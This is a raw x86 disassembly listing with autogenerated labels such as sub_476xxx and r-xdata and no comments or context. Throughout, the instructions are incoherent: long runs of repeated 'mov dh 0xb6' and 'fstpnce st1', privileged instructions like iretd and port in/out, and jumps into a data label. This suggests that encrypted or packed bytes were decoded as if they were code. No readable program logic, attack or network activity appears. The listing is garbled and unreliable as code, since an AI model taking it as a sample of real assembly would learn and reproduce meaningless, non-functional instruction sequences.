fstpnce st1
jge r-xdata
ror [ esi + 0x4c ] cl
inc eax
loope r-xdata
fstpnce st1
lodsd [ esi ]
push esi
push es
lodsd [ esi ]
iret
retn
mov dh 0x40
movsd [ edi ] [ esi ]
sbb al 0x26
iretd
fstp st1
imul [ edi + 0x70d9da7b ]
and cl bh
mov ch 0xdf
sub_4761d6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9ddd6 ] eax
into
push esp
daa
lodsd [ es : esi ]
imul ebp [ esi ] 0xffffffcf
js r-xdata
fstpnce st1
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
pop ds
adc al 0xcf
insd
rcr ecx 0xd9
mov dh 0xab
arpl [ esi - 0x4243090 ] dx
jo r-xdata
fstpnce st1
sub [ ebx - 0x26261b59 ] esp
mov [ 0xffffffffd9d9de92 ] eax
jbe r-xdata
into
movsd [ edi ] [ esi ]
out dx al
and al 0xcf
xchg esi eax
jmp 0xffffffffadc53ba3
pop ebx
xor ch [ ecx ]
mov [ 0xffffffffd9d9e9eb ] eax
stosd [ edi ]
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
loopne r-xdata
out dx eax
iretd
sbb al 0x26
iretd
jo r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcf77
jl r-xdata
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ebx - 0x2626293c ] esp
or eax 0xcff4a2d7
sahf
fstp st1
fldcw [ ecx ]
mov [ 0xffffffffd9d9c052 ] al
jne r-xdata
fstpnce st1
mov dh 0xb6
dec esi
iretd
sub_476377
cmpsd [ esi ] [ edi ]
in al 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0x76
sub [ ecx - 0x52bf89df ] edx
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xad
loope r-xdata
adc eax 0x3dcf67ef
iretd
popad
and al 0xcf
jecxz r-xdata
xchg ecx eax
and [ esi + 0x40 ] esi
lodsd [ esi ]
jpo r-xdata
js r-xdata
jecxz r-xdata
dec esp
push ebp
inc eax
scasd [ edi ]
imul ebx [ eax + 0x40524c7f ] 0xffffffaf
imul esp esp 0x7f
movsd [ edi ] [ esi ]
fadd [ eax - 0x51 ]
pop ebx
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
arpl si bx
jns r-xdata
lodsd [ esi ]
jge r-xdata
div ebx
fstpnce st1
jns r-xdata
retn 0xd9d9
scasd [ edi ]
dec esp
push ebx
inc eax
scasd [ edi ]
imul esp edx 0xffffffad
stc
inc eax
scasd [ edi ]
jpo r-xdata
in al 0x7f
shr [ ebp + 0x22f3cfde ] 0x1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
dec [ ebp + eax * 2 + 0x40 ]
scasd [ edi ]
jpo r-xdata
scasd [ edi ]
pop ebx
salc
lodsd [ esi ]
fadd [ eax - 0x51 ]
pop ebx
aam 0xad
fild [ eax - 0x51 ]
pop ebx
shr [ ebp + 0x5baf40d8 ] cl
sub_476442
salc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jo r-xdata
mov dh 0xb6
mov dh 0xb6
mov [ 0xfffffffffca329e6 ] eax
retn
scasd [ edi ]
arpl dx dx
sbb eax 0xc2bbcfe1
fstpnce st1
jae r-xdata
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
0xcaa7
js r-xdata
jge r-xdata
imul ebx [ eax + 0x40524c7f ] 0xffffffaf
imul esp esp 0x7f
movsd [ edi ] [ esi ]
retn 0xd9d9
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
arpl si bx
jns r-xdata
lodsd [ esi ]
dec [ ebp + eax * 2 + 0x40 ]
scasd [ edi ]
jpo r-xdata
fadd [ eax - 0x51 ]
pop ebx
iretd
jecxz r-xdata
dec esp
push ebp
inc eax
scasd [ edi ]
adc eax 0x3dcf67ef
iretd
div ebx
fstpnce st1
jns r-xdata
dec esp
push ebx
inc eax
scasd [ edi ]
imul esp edx 0xffffffad
stc
inc eax
scasd [ edi ]
jpo r-xdata
in al 0x7f
shr [ ebp + 0x22f3cfde ] 0x1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
scasd [ edi ]
pop ebx
salc
lodsd [ esi ]
fadd [ eax - 0x51 ]
pop ebx
aam 0xad
fild [ eax - 0x51 ]
pop ebx
shr [ ebp + 0x5baf40d8 ] cl
sub_476463
xchg dh al
fstpnce st1
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
inc ebx
fisub [ esi ]
inc edx
xchg esi esp
scasd [ edi ]
arpl dx bx
adc eax 0xda631fe6
sub [ ebx - 0x491a101a ] esi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo sub_476460
adc edi eax
fstpnce st1
inc eax
sbb eax 0xb2a329d5
and ah [ esi ]
iretd
sub_4764af
sbb eax 0xb6d9d99d
mov dh 0xb6
mov dh 0xb6
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9c3fc ] eax
stosd [ edi ]
arpl [ esi - 0x54548f8a ] dx
stosb [ edi ]
fcmovnu st1
fxch st6
inc eax
out dx eax
fstpnce st1
jg r-xdata
fnstenv [ ebp + 0x4c ]
and al 0xd9
jno r-xdata
sbb al bl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ebx - 0x26262013 ] esp
adc eax 0xd70ccfe6
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec esi
and ah [ edi ]
iretd
lodsd [ esi ]
sub_476553
add edi 0xb6b6d9d9
inc eax
scasd [ edi ]
arpl dx dx
dec esp
inc ebx
jle r-xdata
fnstenv [ esi - 0x2ebe314a ]
fstpnce st1
mov [ 0xffffffffdd07cfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd
xlat
movsd [ edi ] [ esi ]
out 0x24 eax
sub [ ecx - 0x265f30c9 ] edx
fstpnce st1
inc eax
scasd [ edi ]
jae r-xdata
scasd [ edi ]
arpl ax dx
dec esp
push esp
jle r-xdata
mov dh 0xb6
jbe r-xdata
dec esp
dec edi
jl r-xdata
iretd
js r-xdata
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ eax + 0x46 ]
lodsd [ esi ]
fstpnce st1
iretd
dec eax
iretd
sub cl bh
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jae r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
jne r-xdata
scasd [ edi ]
bound eax [ edx ]
mov [ ss : 0x5aa229e6 ] eax
out 0xd9 eax
fxch st7
add dl [ ebx - 0x49492627 ]
mov dh 0xb6
mov dh 0xa3
out dx eax
iretd
0xcaa5
lodsd [ esi ]
arpl [ esi ] bp
loope r-xdata
and al 0xd9
jo r-xdata
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
jbe r-xdata
lodsd [ esi ]
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
mov dh 0xb6
arpl [ esi ] bp
iretd
sub_4765d4
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
fstpnce st1
fst [ ebx - 0x26 ]
jno r-xdata
into
pushad
fcmovu st1
fnstenv [ eax + 0x4e ]
xlat
cmp ecx [ edi + 0x66 ]
iretd
int 0xd9
fstpnce st1
jo r-xdata
mov al 0xae
lodsd [ es : esi ]
fisub [ ebx - 0x145dd627 ]
fstpnce st1
dec esp
and cl [ esi + 0x26 ]
push ss
jne r-xdata
fstpnce st1
adc eax 0xfcf3cfd9
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
jno r-xdata
jns r-xdata
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ eax + 0x46 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
jo r-xdata
mov dh 0x4c
inc ebp
inc eax
scasd [ edi ]
arpl sp di
lodsd [ esi ]
fstpnce st1
mov dh 0xab
mov [ 0xffffffffd9d9dd52 ] eax
jbe r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
jne r-xdata
scasd [ edi ]
bound eax [ edx ]
mov [ ss : 0x5aa229e6 ] eax
out 0xd9 eax
fxch st7
add dl [ ebx - 0x49492627 ]
out 0xcf eax
push esi
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
arpl si bx
sbb eax 0xbca229e1
cld
fstpnce st1
iretd
push ebp
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
movsd [ edi ] [ esi ]
sub eax esi
fstpnce st1
iretd
lodsd [ esi ]
dec esp
fnstenv [ ecx + 0x76 ]
iretd
lodsd [ esi ]
arpl [ esi ] bp
loope r-xdata
and al 0xd9
jo r-xdata
loopne r-xdata
jbe r-xdata
lodsd [ esi ]
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
xchg ecx eax
and [ esi + 0x40 ] esi
lodsd [ esi ]
popad
and al 0x40
and eax 0x29060262
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
iretd
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
mov dh 0xb6
arpl [ esi ] bp
iretd
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
or al 0xf9
fstpnce st1
sub_4765fa
cmp bh al
fstpnce st1
mov dh 0xb6
dec esp
inc ebp
inc eax
scasd [ edi ]
arpl sp di
lodsd [ esi ]
out 0xcf eax
push esi
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
arpl si bx
sbb eax 0xbca229e1
cld
fstpnce st1
iretd
sub_47661f
shl cl cl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
fst [ ebp + 0x7e ]
lodsd [ esi ]
loopne r-xdata
xchg ecx eax
and [ esi + 0x40 ] esi
lodsd [ esi ]
popad
and al 0x40
and eax 0x29060262
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
iretd
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
movsd [ edi ] [ esi ]
sub eax esi
fstpnce st1
iretd
or al 0xf9
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
jne r-xdata
scasd [ edi ]
bound eax [ edx ]
mov [ ss : 0x5aa229e6 ] eax
out 0xd9 eax
fxch st7
add dl [ ebx - 0x49492627 ]
lodsd [ esi ]
arpl [ esi ] bp
loope r-xdata
and al 0xd9
jo r-xdata
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
jbe r-xdata
lodsd [ esi ]
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
mov dh 0xb6
arpl [ esi ] bp
iretd
sub_47664f
mov [ 0xffffffffc7a229fd ] eax
fstpnce st1
fst [ ebx - 0x26 ]
jno r-xdata
int 0xd9
fstpnce st1
jo r-xdata
mov al 0xae
lodsd [ es : esi ]
fisub [ ebx - 0x145dd627 ]
fstpnce st1
dec esp
and cl [ esi + 0x26 ]
push ss
jne r-xdata
fstpnce st1
adc eax 0xfcf3cfd9
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
jno r-xdata
jns r-xdata
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ eax + 0x46 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
jo r-xdata
mov dh 0x4c
inc ebp
inc eax
scasd [ edi ]
arpl sp di
lodsd [ esi ]
fstpnce st1
mov dh 0xab
mov [ 0xffffffffd9d9dd52 ] eax
jbe r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
jne r-xdata
scasd [ edi ]
bound eax [ edx ]
mov [ ss : 0x5aa229e6 ] eax
out 0xd9 eax
fxch st7
add dl [ ebx - 0x49492627 ]
out 0xcf eax
push esi
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
arpl si bx
sbb eax 0xbca229e1
cld
fstpnce st1
iretd
push ebp
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
movsd [ edi ] [ esi ]
sub eax esi
fstpnce st1
iretd
lodsd [ esi ]
dec esp
fnstenv [ ecx + 0x76 ]
iretd
lodsd [ esi ]
arpl [ esi ] bp
loope r-xdata
and al 0xd9
jo r-xdata
into
pushad
fcmovu st1
fnstenv [ eax + 0x4e ]
xlat
cmp ecx [ edi + 0x66 ]
iretd
loopne r-xdata
jbe r-xdata
lodsd [ esi ]
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
xchg ecx eax
and [ esi + 0x40 ] esi
lodsd [ esi ]
popad
and al 0x40
and eax 0x29060262
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
iretd
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
mov dh 0xb6
arpl [ esi ] bp
iretd
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
or al 0xf9
fstpnce st1
sub_47669f
cmp bl 0xd9
fldcw [ ecx ]
xchg ecx eax
and [ esi + 0x40 ] esi
lodsd [ esi ]
popad
and al 0x40
and eax 0x29060262
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
movsd [ edi ] [ esi ]
sub eax esi
fstpnce st1
iretd
or al 0xf9
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
jne r-xdata
scasd [ edi ]
bound eax [ edx ]
mov [ ss : 0x5aa229e6 ] eax
out 0xd9 eax
fxch st7
add dl [ ebx - 0x49492627 ]
lodsd [ esi ]
arpl [ esi ] bp
loope r-xdata
and al 0xd9
jo r-xdata
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
jbe r-xdata
lodsd [ esi ]
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
mov dh 0xb6
arpl [ esi ] bp
iretd
sub_4766f9
fstp st1
sub [ ebx - 0x26266a42 ] esp
adc eax 0xf5f2cfe6
fstpnce st1
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl si bx
adc eax 0x63af40e6
fmul [ esi + 0x22 ]
daa
stosd [ edi ]
mov [ 0xffffffffd9d9dda2 ] eax
jbe r-xdata
mov dh 0xb6
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
iretd
arpl [ esi ] bp
iretd
sub_476727
fstpnce st1
mov dh 0xb6
stosd [ edi ]
imul edi esi 0xffffffab
arpl [ esi - 0x266a0132 ] cx
fldenv [ ebx - 0x1d2c301a ]
fstpnce st1
mov dh 0xad
arpl [ esi ] bp
loope r-xdata
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
rcl [ ebp + 0x44 ] cl
dec edi
inc ebx
iretd
sub_4767e8
push es
xchg esp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xae
arpl si dx
scasb [ edi ]
arpl si ax
scasb [ edi ]
arpl si si
scasb [ edi ]
arpl si sp
stosd [ edi ]
imul eax edx 0xffffffcf
xchg bl cl
fstpnce st1
scasd [ edi ]
push edx
push ss
sub ah al
bound edx [ esi ]
in eax 0x15
out 0x76 al
iretd
sub_476888
sub ecx [ eax - 0x49492627 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebp + 0x16 ]
lodsd [ esi ]
fcomp st1
push edx
add al [ edx ]
sub [ ebx - 0x26260016 ] esp
into
xor cl ah
fstpnce st1
iretd
sub_4768ab
loope r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
imul edx edx 0xffffffaf
jae r-xdata
fst [ edx + 0x2 ]
add ch [ ecx ]
mov [ 0xffffffffd9d9ffea ] eax
into
xor cl ah
fstpnce st1
iretd
lodsd [ esi ]
arpl dx bx
scasd [ edi ]
arpl dx ax
lodsd [ esi ]
arpl si bx
iretd
sub_4768c7
sub esi esi
fstpnce st1
mov dh 0xb6
mov dh 0xef
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
pop ebx
fimul [ eax + esi * 2 - 0x31 ]
adc al 0x95
fstpnce st1
mov [ 0xfffffffff508cfef ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
cwde
or ah [ esi ]
adc eax 0x8cf70fd

sub_4768fd
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
inc [ eax - 0x51 ]
jpo r-xdata
movsd [ edi ] [ esi ]
out 0x24 al
sub [ ecx - 0x3c1230ea ] edx
fstpnce st1
mov dh 0xb6
dec esp
jpe r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
mov dh 0xb6
jo r-xdata
loopne r-xdata
fstpnce st1
mov dh 0xce
adc eax 0x7baf40fd
xor al 0xcf
fadd st2
fstpnce st1
mov dh 0xb6
mov dh 0x29
xchg ecx eax
and al 0x40
sbb eax 0x25b7cf27
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9dd95 ] al
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
push ebp
push ss
lodsd [ esi ]
fcomp st1
push edx
add al [ edx ]
sub [ ebx - 0x26260016 ] esp
into
xor cl ah
fstpnce st1
iretd
or ah [ esi ]
adc eax 0x8cf70fd

scasd [ edi ]
jpo r-xdata
loope r-xdata
std
fcompp
fldenv [ ebp - 0x4330d51e ]
pushfd
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x71
scasd [ edi ]
pushad
sub cl bh
aas
cmc
fstpnce st1
mov dh 0xce
xchg ecx eax
fcompp
fldcw [ ebp + 0x56ad2e63 ]
sbb ah [ 0x609129d6 ]
xor ah [ ebp + 0x62ab2ae2 ]
push ss
iretd
iretd
iretd
sub_476992
mov dh 0xab
stosd [ edi ]
mov [ 0xffffffffabd9d9dd ] al
mov [ 0xffffffffd9d9dbaa ] eax
into
xchg ebp eax
fstp st1
fxch st7
cwde
cdq
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
sub eax 0x1dd9d9eb
in eax 0x29
mov [ 0xffffffffd9d9e603 ] al
iretd
sub_4769e0
mov ecx 0xb6d9d9fd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4c
and cl bh
sbb ebp ebx
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xae
lodsd [ cs : esi ]
arpl dx bx
scasw [ edi ]
arpl dx bx
iretd
sub_476a14
dec edx
fcmovnu st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
cwde
std
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
pushad
nop
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
pushfd
fcomp st1
fxch st7
and [ eax + 0x2cfd9d9 ] ecx
aad 0xd9
fnstenv [ esi - 0x4949494a ]
stosd [ edi ]
arpl si di
iretd
scasd [ edi ]
bound eax [ edx ]
push es
mov [ 0x14a229e6 ] eax
in eax 0xd9
fldcw [ ebp - 0x26c1fd9e ]
push edx
add dh [ esi ]
iretd
sub_476a41
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
les ebp [ ecx ]
lodsb [ esi ]
xor bl [ edi + ecx * 8 ]
enter 0xd998 0xd9
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
pushad
nop
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
pushfd
fcomp st1
fxch st7
and [ eax + 0x2cfd9d9 ] ecx
aad 0xd9
fnstenv [ esi - 0x4949494a ]
stosd [ edi ]
arpl si di
iretd
sub_476a9c
int1
salc
fstpnce st1
mov dh 0x40
scasd [ edi ]
imul edx edx 0xffffffad
out dx al
inc eax
scasd [ edi ]
arpl sp bx
adc eax 0xcf5e4ce6
push edx
aad 0xd9
fnstenv [ esi + 0x57d9b6b6 ]
fisubr [ ebp - 0x219052d9 ]
iretd
sub_476ac0
stc
salc
fstpnce st1
mov dh 0x40
scasd [ edi ]
arpl dx cx
jle r-xdata
inc eax
scasd [ edi ]
pop ebx
mov al 0x40
scasd [ edi ]
jpo r-xdata
dec edi
inc eax
scasd [ edi ]
arpl ax cx
jle r-xdata
lodsd [ esi ]
out dx al
inc eax
scasd [ edi ]
arpl sp bx
adc eax 0xcf5e4ce6
push edx
aad 0xd9
fnstenv [ esi + 0x57d9b6b6 ]
fisubr [ ebp - 0x219052d9 ]
iretd
inc eax
scasd [ edi ]
jae r-xdata
xchg [ eax - 0x51 ] al
inc eax
inc eax
scasd [ edi ]
arpl si dx
jle r-xdata
into
sub ebp esp
fstpnce st1
jg r-xdata
in eax 0xd9
fnstcw [ edi - 0x31 ]
dec edi
inc eax
scasd [ edi ]
arpl sp dx
jle r-xdata
fst [ ebx - 0x32 ]
inc ebx
fwait
fstpnce st1
dec esi
iretd
iretd
fnstenv [ ecx + 0x262626a2 ]
iretd
mov edx edi
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl si bx
and eax 0xaf76da6b
scasb [ edi ]
xchg esi eax
fst [ es : ebx - 0x32 ]
sub_476b03
shl ebx 0x1
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
imul ecx [ esi - 0x55545490 ] 0xffffffdb
fstpnce st1
inc eax
scasd [ edi ]
pop ebx
mov al 0x40
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
out dx al
inc eax
scasd [ edi ]
arpl sp bx
adc eax 0xcf5e4ce6
push edx
aad 0xd9
fnstenv [ esi + 0x57d9b6b6 ]
fisubr [ ebp - 0x219052d9 ]
iretd
inc eax
scasd [ edi ]
jae r-xdata
into
sub ebp esp
fstpnce st1
jg r-xdata
fst [ ebx - 0x32 ]
fnstenv [ ecx + 0x262626a2 ]
iretd
inc ebx
fwait
fstpnce st1
dec esi
iretd
sub_476b4d
pop ebx
fcmovnu st1
fnstenv [ esi + 0x4cb6b6b6 ]
and al 0x4e
fsubp st2
sbb [ edi - 0x27 ] ebp
xchg ecx eax
loop r-xdata
mov dh 0x29
xchg ecx eax
inc eax
mov [ 0xffffffffff70cfef ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
or bh ah
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
fnstenv [ esi + 0x5fcfb6b6 ]
scasd [ edi ]
arpl ax dx
adc eax 0x9697cfe6
fstpnce st1
mov dh 0xad
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl dx dx
jle r-xdata
iretd
scasd [ edi ]
mov al [ 0x262626d6 ]
jne r-xdata
or esi 0xffffffd9
fnstenv [ esi - 0x697cb14a ]
cmp eax 0x60af710e
push edx
iretd
scasd [ edi ]
jpo r-xdata
dec esi
add [ ebp + 0x4c ] al
mov cl 0x75
scasd [ edi ]
mov al [ 0x262626ce ]
into
lodsd [ esi ]
fwait
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
arpl si ax
inc edi
inc edx
push eax
inc edi
loope r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
dec esi
and [ esi ] ah
and al 0x26
jne r-xdata
arpl dx cx
iretd
iretd
stosd [ edi ]
arpl si ax
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
iretd
retn 0x4f56
fmulp st7
mov dl 0xf5
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
jbe r-xdata
in al dx
fstpnce st1
lodsd [ esi ]
bound eax [ edx ]
and cl bh
aaa
enter 0xd9d9 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
std
stosd [ edi ]
arpl dx bx
jbe r-xdata
aad 0x90
fstpnce st1
mov dh 0xb6
mov dh 0xcf
pop edi
sub_476bc7
and eax ecx
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
fnstenv [ ecx + 0x2626268a ]
dec esp
inc edx
iretd
and [ esi ] ah
and al 0x26
jne r-xdata
fmulp st7
mov dl 0xf5
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
jbe r-xdata
aad 0x90
fstpnce st1
mov dh 0xb6
mov dh 0xcf
pop edi
or esi 0xffffffd9
fnstenv [ esi - 0x697cb14a ]
cmp eax 0x60af710e
push edx
iretd
scasd [ edi ]
jpo r-xdata
scasd [ edi ]
mov al [ 0x262626d6 ]
jne r-xdata
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl dx dx
jle r-xdata
iretd
dec esi
add [ ebp + 0x4c ] al
mov cl 0x75
scasd [ edi ]
mov al [ 0x262626ce ]
into
lodsd [ esi ]
fwait
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
arpl si ax
inc edi
inc edx
push eax
inc edi
loope r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
dec esi
arpl dx cx
iretd
in al dx
fstpnce st1
lodsd [ esi ]
bound eax [ edx ]
and cl bh
aaa
enter 0xd9d9 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
std
stosd [ edi ]
arpl dx bx
jbe r-xdata
fnstenv [ esi + 0x5fcfb6b6 ]
scasd [ edi ]
arpl ax dx
adc eax 0x9697cfe6
fstpnce st1
mov dh 0xad
stosd [ edi ]
arpl si ax
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
iretd
retn 0x4f56
sub_476c44
dec ecx
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jpo r-xdata
fldcw [ ebp - 0x1fad30dc ]
fstpnce st1
movsd [ edi ] [ esi ]
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
push edx
loopne r-xdata
